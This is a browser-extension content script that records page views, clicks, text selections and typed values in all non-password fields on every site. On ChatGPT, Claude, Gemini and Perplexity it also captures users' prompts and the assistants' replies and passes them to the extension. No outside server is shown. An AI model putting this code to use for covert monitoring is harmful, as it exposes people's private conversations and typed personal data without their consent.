// ── Content Script v3 — fixed selectors for 2026 ──
(function () {
  'use strict';

  const SESSION_ID = crypto.randomUUID
    ? crypto.randomUUID()
    : Date.now() + '-' + Math.random().toString(36).slice(2);
  const SITE = location.hostname;

  function emit(type, payload = {}) {
    try {
      const api = (typeof browser !== 'undefined') ? browser : chrome;
      api.runtime.sendMessage({
        type,
        sessionId: SESSION_ID,
        site:      SITE,
        url:       location.href,
        title:     document.title,
        ts:        new Date().toISOString(),
        payload
      });
    } catch (_) {}
  }

  function cssPath(el) {
    if (!el) return '';
    const parts = [];
    while (el && el !== document.body) {
      let seg = el.tagName.toLowerCase();
      if (el.id) { seg += '#' + el.id; break; }
      else if (el.className) seg += '.' + String(el.className).trim().split(/\s+/)[0];
      parts.unshift(seg);
      el = el.parentElement;
    }
    return parts.slice(-4).join(' > ');
  }

  function getSafeValue(el) {
    if (!el) return '';
    if (el.type === 'password') return '[REDACTED]';
    return (el.value || el.innerText || '').trim().slice(0, 2000);
  }

  // ══════════════════════════════════════
  // 1. Generic page events
  // ══════════════════════════════════════
  emit('page_view');

  document.addEventListener('click', (e) => {
    const el = e.target.closest("button,a,[role='button']");
    if (!el) return;
    emit('click', { text: (el.innerText || '').slice(0, 300), selector: cssPath(el) });
  }, true);

  const inputTimers = new WeakMap();
  document.addEventListener('input', (e) => {
    const el = e.target;
    if (!(el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement || el.isContentEditable)) return;
    clearTimeout(inputTimers.get(el));
    inputTimers.set(el, setTimeout(() => {
      emit('input_change', {
        selector:  cssPath(el),
        value:     getSafeValue(el),
        fieldName: el.name || el.getAttribute('aria-label') || el.tagName
      });
    }, 1500));
  }, true);

  document.addEventListener('mouseup', () => {
    const sel = window.getSelection()?.toString().trim();
    if (sel && sel.length > 15) emit('text_selected', { value: sel.slice(0, 1000) });
  });

  // ══════════════════════════════════════
  // 2. AI chat adapters — 2026 selectors
  // ══════════════════════════════════════

  const ADAPTERS = {

    // ── ChatGPT (chat.openai.com AND chatgpt.com) ──
    'chatgpt.com': {
      name: 'openai',
      // Multiple fallback selectors for prompt input
      promptSelectors: [
        '#prompt-textarea',
        'div[contenteditable="true"][data-testid="chat-input"]',
        'div[contenteditable="true"][aria-label]',
        'textarea[data-id="root"]'
      ],
      // Send button fallbacks
      sendSelectors: [
        'button[data-testid="send-button"]',
        'button[aria-label="Send message"]',
        'button[aria-label="Send prompt"]'
      ],
      // Assistant message containers
      assistantSelectors: [
        '[data-message-author-role="assistant"] .markdown',
        '[data-message-author-role="assistant"]',
        '.agent-turn .markdown',
        'div.group\\/conversation-turn[data-testid*="conversation-turn"] .markdown'
      ],
      userSelectors: [
        '[data-message-author-role="user"]',
        '.human-turn'
      ],
      extractConvId() {
        const m = location.pathname.match(/\/c\/([a-zA-Z0-9-]+)/);
        return m?.[1] || null;
      },
      extractModel() {
        return document.querySelector('[data-testid="model-switcher-dropdown-button"]')
          ?.innerText?.trim()
          || document.title.match(/GPT-[\w.]+/)?.[0]
          || 'chatgpt';
      }
    },

    // Also handle chat.openai.com
    'chat.openai.com': null, // filled below

    // ── Claude.ai ──
    'claude.ai': {
      name: 'claude',
      promptSelectors: [
        'div[contenteditable="true"][aria-label]',
        'div.ProseMirror[contenteditable="true"]',
        'div[contenteditable="true"]'
      ],
      sendSelectors: [
        'button[aria-label="Send Message"]',
        'button[aria-label="Send message"]',
        'button[type="button"][aria-label*="Send"]'
      ],
      assistantSelectors: [
        '[data-testid="ai-response"] .prose',
        '[data-testid="ai-response"]',
        '.font-claude-message',
        'div.grid-cols-1 .prose'
      ],
      userSelectors: [
        '[data-testid="user-message"]',
        '.font-user-message'
      ],
      extractConvId() {
        const m = location.pathname.match(/\/chat\/([a-zA-Z0-9-]+)/);
        return m?.[1] || null;
      },
      extractModel() { return 'claude'; }
    },

    // ── Gemini ──
    'gemini.google.com': {
      name: 'gemini',
      promptSelectors: [
        'rich-textarea div[contenteditable="true"]',
        'div[contenteditable="true"][aria-label*="message"]'
      ],
      sendSelectors: ['button.send-button', 'button[aria-label="Send message"]'],
      assistantSelectors: ['.model-response-text', '.response-content .markdown'],
      userSelectors: ['.user-query-text'],
      extractConvId() {
        const m = location.pathname.match(/\/app\/([a-zA-Z0-9]+)/);
        return m?.[1] || null;
      },
      extractModel() { return 'gemini'; }
    },

    // ── Perplexity ──
    'www.perplexity.ai': {
      name: 'perplexity',
      promptSelectors: ['textarea[placeholder]'],
      sendSelectors: ['button[aria-label="Submit"]', 'button[type="submit"]'],
      assistantSelectors: ['.prose', '.answer-content'],
      userSelectors: ['.font-medium.break-words'],
      extractConvId() {
        const m = location.pathname.match(/\/search\/([a-zA-Z0-9-]+)/);
        return m?.[1] || null;
      },
      extractModel() { return 'perplexity'; }
    }
  };

  // Mirror chatgpt adapter for chat.openai.com
  ADAPTERS['chat.openai.com'] = ADAPTERS['chatgpt.com'];

  const adapter = ADAPTERS[SITE];
  if (!adapter) return; // Not an AI site

  // ── Helper: find first matching element from selector list ──
  function findFirst(selectors) {
    for (const sel of selectors) {
      try {
        const el = document.querySelector(sel);
        if (el) return el;
      } catch (_) {}
    }
    return null;
  }

  function findAll(selectors) {
    for (const sel of selectors) {
      try {
        const els = document.querySelectorAll(sel);
        if (els.length > 0) return [...els];
      } catch (_) {}
    }
    return [];
  }

  // ── Capture send button click → grab prompt text ──
  document.addEventListener('click', (e) => {
    const sendBtn = adapter.sendSelectors.some(sel => {
      try { return e.target.closest(sel); } catch(_) { return false; }
    });
    if (!sendBtn) return;

    // Try to grab prompt from input
    const inputEl = findFirst(adapter.promptSelectors);
    const text = getSafeValue(inputEl || document.createElement('div'));
    if (!text || text.length < 2) return;

    emit('prompt_submit', {
      role:           'user',
      text,
      model:          adapter.extractModel(),
      conversationId: adapter.extractConvId(),
      final:          true
    });
  }, true);

  // Also capture Enter key submit
  document.addEventListener('keydown', (e) => {
    if (e.key !== 'Enter' || e.shiftKey) return;
    const inputEl = findFirst(adapter.promptSelectors);
    if (!inputEl || !inputEl.contains(e.target)) return;
    const text = getSafeValue(inputEl);
    if (!text || text.length < 2) return;
    emit('prompt_submit', {
      role: 'user', text,
      model: adapter.extractModel(),
      conversationId: adapter.extractConvId(),
      final: true
    });
  }, true);

  // ── MutationObserver for assistant replies ──
  const seen = new Map();

  function checkAssistantMessages() {
    const els = findAll(adapter.assistantSelectors);
    els.forEach(el => {
      const text = (el.innerText || el.textContent || '').trim();
      if (!text || text.length < 10) return;
      if (seen.get(el) === text) return; // no change
      seen.set(el, text);

      const isStreaming =
        !!el.querySelector('.result-streaming, .cursor, [data-is-streaming]') ||
        el.classList.contains('result-streaming') ||
        !!document.querySelector('button[aria-label="Stop generating"], button[aria-label="Stop"]');

      emit(isStreaming ? 'assistant_chunk' : 'assistant_message_final', {
        role:           'assistant',
        text:           text.slice(0, 8000),
        model:          adapter.extractModel(),
        conversationId: adapter.extractConvId(),
        messageId:      el.getAttribute('data-message-id') || null,
        final:          !isStreaming
      });
    });
  }

  // Start observer
  function startObserver() {
    const observer = new MutationObserver(() => checkAssistantMessages());
    observer.observe(document.body, {
      childList: true, subtree: true, characterData: true
    });
    // Also run immediately in case messages already exist
    checkAssistantMessages();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', startObserver);
  } else {
    startObserver();
  }

})();
